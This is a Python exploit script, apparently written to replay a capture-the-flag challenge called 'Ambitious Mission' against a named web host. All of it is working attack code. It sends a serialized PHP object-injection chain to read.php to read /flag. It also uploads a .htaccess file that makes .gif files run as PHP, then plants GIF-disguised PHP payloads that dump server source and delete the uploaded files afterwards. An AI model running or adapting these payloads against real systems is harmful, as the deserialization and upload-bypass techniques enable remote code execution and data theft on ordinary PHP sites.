#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ambitious Mission —— 一键重放（仅标准库，无第三方依赖）

目标: http://pv5cl84fwfwuwkuz.neu-nex.fun

两条链:
  A. read.php 的 PHP 对象注入（真正读 flag 的路）
     Store::__destruct -> echo $item
       -> Wrapper::__toString -> $obj->read()
         -> Reader 无 read() -> __call('read') -> file_get_contents($this->file)
     默认 $file = '/flag'
  B. 上传黑名单漏掉 .htaccess（无扩展名直接放行）
     上传 "AddType application/x-httpd-php .gif" 后，GIF 伪装的 PHP 被执行（RCE），
     用来 dump 源码确认 A；但 RCE 受 open_basedir=/var/www/html:/tmp 限制，读不到 /flag。

用法:
  python exp.py                     # 只跑 A，取 flag
  python exp.py --rce               # 先跑 B dump 源码，再跑 A，最后清理上传物
  python exp.py http://host:port    # 换实例
"""
import re
import sys
import uuid
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://pv5cl84fwfwuwkuz.neu-nex.fun"
ARGS = [a for a in sys.argv[1:] if not a.startswith("--")]
if ARGS:
    BASE = ARGS[0].rstrip("/")
DO_RCE = "--rce" in sys.argv

FLAG_RE = re.compile(r"(?:flag|nex|FLAG|NEX)\{[^}]{1,200}\}")

CHAIN = (
    'O:5:"Store":1:{s:4:"item";O:7:"Wrapper":1:{s:3:"obj";'
    'O:6:"Reader":1:{s:4:"file";s:5:"/flag";}}}'
)

HTACCESS = "AddType application/x-httpd-php .gif\n"
DUMPER = (
    'GIF89a\n<?php echo "===SRC===\\n";\n'
    'echo @file_get_contents("/var/www/html/read.php");\n'
    'echo "\\n===OB===".ini_get("open_basedir")."\\n";'
    'echo "===FLAG_RCE===".var_export(@file_get_contents("/flag"), true)."\\n";\n?>'
)
CLEANER = (
    'GIF89a\n<?php\n$d="/var/www/html/upload/";\n'
    'foreach([".htaccess","exp_dump.gif","exp_b64.gif","exp_clean.gif"] as $n){'
    ' if(file_exists($d.$n)){@unlink($d.$n); echo "del $n\\n";} }\n'
    'echo "LEFT=".implode(",",@scandir($d))."\\n";\n?>'
)


def request(path, data=None, headers=None, method=None):
    req = urllib.request.Request(BASE + path, data=data, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def upload(filename, content, ctype="image/gif"):
    boundary = "----exp" + uuid.uuid4().hex
    body = ("--%s\r\n" % boundary).encode()
    body += (
        'Content-Disposition: form-data; name="file"; filename="%s"\r\n' % filename
    ).encode()
    body += ("Content-Type: %s\r\n\r\n" % ctype).encode()
    body += content.encode() if isinstance(content, str) else content
    body += ("\r\n--%s--\r\n" % boundary).encode()
    return request(
        "/",
        data=body,
        headers={"Content-Type": "multipart/form-data; boundary=" + boundary},
    )


def step_rce():
    """B 链：上传 .htaccess + GIF 伪装的 PHP，dump read.php 源码。"""
    st, body = upload(".htaccess", HTACCESS, "text/plain")
    msg = re.search(rb'<div class="msg">(.*?)</div>', body, re.S)
    print("[B] upload .htaccess ->", st, msg.group(1).decode() if msg else "")

    st, _ = upload("exp_dump.gif", DUMPER)
    print("[B] upload exp_dump.gif ->", st)

    st, body = request("/upload/exp_dump.gif", headers={"Cache-Control": "no-cache"})
    text = body.decode("utf-8", "replace")
    for label, pat in (
        ("open_basedir", r"===OB===(.*)"),
        ("RCE 直读 /flag", r"===FLAG_RCE===(.*)"),
    ):
        m = re.search(pat, text)
        if m:
            print("[B] %s -> %s" % (label, m.group(1).strip()))
    m = re.search(r"===SRC===\n(.*?)\n===OB===", text, re.S)
    if m:
        print("[B] read.php 源码:\n" + m.group(1))
    return text


def step_flag():
    """A 链：对象注入读 /flag。"""
    q = urllib.parse.urlencode({"data": CHAIN})
    st, body = request("/read.php?" + q, headers={"Cache-Control": "no-cache"})
    text = body.decode("utf-8", "replace")
    print("[A] GET /read.php?data=<chain> ->", st, "len", len(text))
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


def step_clean():
    st, _ = upload("exp_clean.gif", CLEANER)
    st, body = request("/upload/exp_clean.gif", headers={"Cache-Control": "no-cache"})
    print("[C] 清理:", body.decode("utf-8", "replace").strip().replace("\n", " | "))


def main():
    print("target:", BASE)
    if DO_RCE:
        step_rce()
    flag = step_flag()
    if flag:
        print("\n[+] FLAG:", flag)
    else:
        print("\n[-] 未命中，检查目标是否存活 / 链路是否被改")
    if DO_RCE:
        step_clean()
    return 0 if flag else 1


if __name__ == "__main__":
    sys.exit(main())
